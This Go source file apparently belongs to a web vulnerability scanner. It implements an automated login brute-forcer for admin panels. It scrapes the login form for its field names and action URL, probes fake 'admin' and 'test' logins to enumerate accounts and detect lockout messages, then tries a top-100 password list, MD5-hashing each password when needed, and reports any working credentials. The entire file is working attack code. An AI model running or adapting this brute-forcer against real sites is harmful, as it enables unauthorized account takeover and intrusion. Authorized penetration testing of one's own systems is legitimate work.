package brute

import (
	"crypto/md5"
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/url"
	"regexp"
	"strings"
)

func getinput(domainurl string) (usernamekey string, passwordkey string, domainurlx string, ismd5 bool) {
	var username = "username"
	var password = "password"
	var loginurl = domainurl + "/login"
	if req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil); err == nil {
		if strings.Contains(req.Body, "md5.js") {
			ismd5 = true
		}
		hrefreg := regexp.MustCompile(`location.href=['"](.*?)['"]`)
		hreflist := hrefreg.FindStringSubmatch(req.Body)
		if hreflist != nil {
			req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
			if err != nil {
				return "", "", "", ismd5
			}
		}
		userreg := regexp.MustCompile(`<input.*?name=['"](\w*?name\w*?|\w*?Name\w*?|\w*?user\w*?|\w*?User\w*?|\w*?USER\w*?|\w*?log\w*?)['"].*?>`)
		usernamelist := userreg.FindStringSubmatch(req.Body)
		if usernamelist != nil {
			username = usernamelist[len(usernamelist)-1:][0]
		}
		passreg := regexp.MustCompile(`<input.*?name=['"](\w*?pass\w*?|\w*?Pass\w*?|\w*?PASS\w*?|\w*?pwd\w*?|\w*?Pwd\w*?|\w*?PWD\w*?)['"].*?>`)
		passlist := passreg.FindStringSubmatch(req.Body)
		if passlist != nil {
			password = passlist[len(passlist)-1:][0]
		}
		domainreg := regexp.MustCompile(`<form.*?action=['"](.*?)['"]`)
		domainlist := domainreg.FindStringSubmatch(req.Body)
		if domainlist != nil {
			domainx := domainlist[len(domainlist)-1:][0]
			if strings.Contains(domainx, "http") {
				loginurl = domainx
			} else if domainx == "" {
				loginurl = loginurl
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = u.Scheme + "://" + u.Host + domainlist[len(domainlist)-1:][0]
			} else {
				loginurl = domainurl + "/" + domainlist[len(domainlist)-1:][0]
			}
		} else {
			domainreg2 := regexp.MustCompile(`,\s+url.*?:.*?['"](.*?)['"],`)
			domainlist2 := domainreg2.FindStringSubmatch(req.Body)
			if domainlist2 != nil {
				domainx := domainlist2[len(domainlist2)-1:][0]
				if strings.Contains(domainx, "http") {
					loginurl = domainx
				} else if domainx == "" {
					loginurl = loginurl
				} else if domainx[0:1] == "/" {
					u, _ := url.Parse(domainurl)
					loginurl = u.Scheme + "://" + u.Host + domainlist2[len(domainlist2)-1:][0]
				} else {
					loginurl = domainurl + "/" + domainlist2[len(domainlist2)-1:][0]
				}
			}
		}
	}
	return username, password, loginurl, ismd5
}

func Admin_brute(u string) (username string, password string, loginurl string) {
	usernamekey, passwordkey, loginurl, ismd5 := getinput(u)
	var (
		adminfalsedata        = fmt.Sprintf("%s=admin&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey)
		testfalsedata         = fmt.Sprintf("%s=test&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey)
		adminaccount          = true
		testaccount           = true
		usernames             []string
		noaccount             = []string{"不存在", "用户名错误", "\\u4e0d\\u5b58\\u5728", "\\u7528\\u6237\\u540d\\u9519\\u8bef"}
		lockContent           = []string{"锁定", "次数超", "超次数", "验证码错误", "\\u9501\\u5b9a", "\\u6b21\\u6570\\u8d85", "\\u8d85\\u6b21\\u6570", "\\u9a8c\\u8bc1\\u7801\\u9519\\u8bef"}
		adminfalseContentlen  int
		testfalseContentlen   int
		falseis302            = false
		falseis401            = false
		falseis500            = false
		falseis200            = false
		adminfalse302location string
		testfalse302location  string
	)
	if adminfalseurl, err := pkg.HttpRequset(loginurl, "POST", adminfalsedata, false, nil); err == nil {
		code := adminfalseurl.StatusCode
		switch code {
		case 301, 302, 307, 308:
			falseis302 = true
			if strings.Contains(adminfalseurl.Location, ";") {
				adminfalseurl.Location = regexp.MustCompile(`(.*);`).FindString(adminfalseurl.Location)
			}
			adminfalse302location = adminfalseurl.Location
		case 401:
			falseis401 = true
		case 200:
			if pkg.SliceInString(adminfalseurl.Body, noaccount) {
				adminaccount = false
			}
			falseis200 = true
			adminfalseContentlen = adminfalseurl.ContentLength
		default:
			falseis500 = true
		}
	} else {
		falseis500 = true
	}

	if testfalseurl, err := pkg.HttpRequset(loginurl, "POST", testfalsedata, false, nil); err == nil {
		code := testfalseurl.StatusCode
		switch code {
		case 301, 302, 307, 308:
			falseis302 = true
			if strings.Contains(testfalseurl.Location, ";") {
				testfalseurl.Location = regexp.MustCompile(`(.*);`).FindString(testfalseurl.Location)
			}
			testfalse302location = testfalseurl.Location
		case 401:
			falseis401 = true
		case 200:
			if pkg.SliceInString(testfalseurl.Body, noaccount) {
				testaccount = false
			}
			falseis200 = true
			testfalseContentlen = testfalseurl.ContentLength
		default:
			falseis500 = true
		}
	} else {
		falseis500 = true
	}
	if adminaccount {
		usernames = append(usernames, "admin")
	}
	if testaccount {
		usernames = append(usernames, "test")
	}
	if !adminaccount && !testaccount {
		falseis500 = true
	}
	if falseis200 && adminfalseContentlen == 0 && testfalseContentlen == 0 {
		falseis500 = true
	}
	if falseis500 {
		return "", "", ""
	}
	for _, user := range usernames {
		for _, pass := range top100pass {
			if ismd5 {
				data := []byte(pass)
				has := md5.Sum(data)
				pass = fmt.Sprintf("%x", has)
			}
			if req, err2 := pkg.HttpRequset(loginurl, "POST", fmt.Sprintf("%s=%s&%s=%s", usernamekey, user, passwordkey, pass), false, nil); err2 == nil {
				if falseis401 {
					if req.StatusCode != 401 {
						fmt.Printf("[+] Found vuln admin password|%s:%s|%s\n", user, pass, loginurl)
						return user, pass, loginurl
					}
				}
				if falseis302 {
					if strings.Contains(req.Location, ";") {
						req.Location = regexp.MustCompile(`(.*);`).FindString(req.Location)
					}
					if req.Location != adminfalse302location && req.Location != testfalse302location {
						fmt.Printf("[+] Found vuln admin password|%s:%s|%s\n", user, pass, loginurl)
						return user, pass, loginurl
					}
				}
				if falseis200 {
					if pkg.SliceInString(req.Body, lockContent) {
						return "", "", ""
					}
					if (req.ContentLength != 0 || req.StatusCode == 301 || req.StatusCode == 302 || req.StatusCode == 307 || req.StatusCode == 308) && req.ContentLength != adminfalseContentlen && req.ContentLength != testfalseContentlen {
						fmt.Printf("[+] Found vuln admin password|%s:%s|%s\n", user, pass, loginurl)
						return user, pass, loginurl
					}
				}
			}
		}
	}
	return "", "", ""
}
